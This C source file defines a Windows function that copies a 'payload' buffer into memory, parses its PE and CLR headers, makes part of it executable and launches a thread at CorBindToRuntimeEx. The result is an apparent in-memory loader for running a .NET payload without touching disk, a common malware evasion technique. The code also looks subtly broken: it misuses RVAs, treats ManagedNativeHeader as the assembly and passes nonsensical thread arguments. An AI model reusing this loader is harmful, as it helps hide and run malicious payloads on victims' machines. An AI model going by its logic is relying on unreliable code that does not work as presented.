#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void execute(BYTE* payload, int payloadLength)
{
    int rva = 0;
    IMAGE_DOS_HEADER* dosHeader;
    IMAGE_NT_HEADERS* ntHeaders;
    IMAGE_SECTION_HEADER* sectionHeader;
    IMAGE_COR20_HEADER* clrHeader;
    DWORD oldProtect, newProtect;
    BYTE* baseAddress;
    BYTE* assemblyAddress;
    DWORD assemblySize;
    HANDLE hThread;
    DWORD threadId;
    DWORD* funcAddress;

    baseAddress = VirtualAlloc(0, payloadLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(baseAddress, payload, payloadLength);

    dosHeader = (IMAGE_DOS_HEADER*)baseAddress;
    ntHeaders = (IMAGE_NT_HEADERS*)((BYTE*)baseAddress + dosHeader->e_lfanew);
    sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    clrHeader = (IMAGE_COR20_HEADER*)((BYTE*)baseAddress + ntHeaders->OptionalHeader.DataDirectory[14].VirtualAddress);

    assemblyAddress = (BYTE*)baseAddress + clrHeader->ManagedNativeHeader.VirtualAddress;
    assemblySize = clrHeader->ManagedNativeHeader.Size;

    VirtualProtect(assemblyAddress, assemblySize, PAGE_EXECUTE_READWRITE, &oldProtect);
    funcAddress = (DWORD*)GetProcAddress(GetModuleHandle("mscoree.dll"), "CorBindToRuntimeEx");
    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)funcAddress, assemblyAddress, 0, &threadId);
    WaitForSingleObject(hThread, INFINITE);
    VirtualProtect(assemblyAddress, assemblySize, oldProtect, &newProtect);
    VirtualFree(baseAddress, 0, MEM_RELEASE);
}

